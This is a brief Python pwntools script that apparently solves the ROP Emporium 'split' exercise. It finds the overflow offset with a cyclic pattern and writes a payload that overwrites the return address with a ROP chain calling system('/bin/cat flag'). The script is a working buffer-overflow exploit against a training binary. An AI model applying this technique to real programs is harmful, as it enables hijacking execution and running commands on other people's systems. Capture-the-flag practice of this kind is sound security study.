#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

open('cyclic.txt', 'w').write(cyclic(0x60, n=8) + '\n')
N = cyclic_find('faaaaaaag', n=8)

e = ELF('split')
print(e.symbols)
cat = list(e.search('/bin/cat flag'))[0]

rop = ROP(e)
rop.system(cat)
open('input.txt', 'wb').write(b'A' * N + rop.chain() + b'\n')
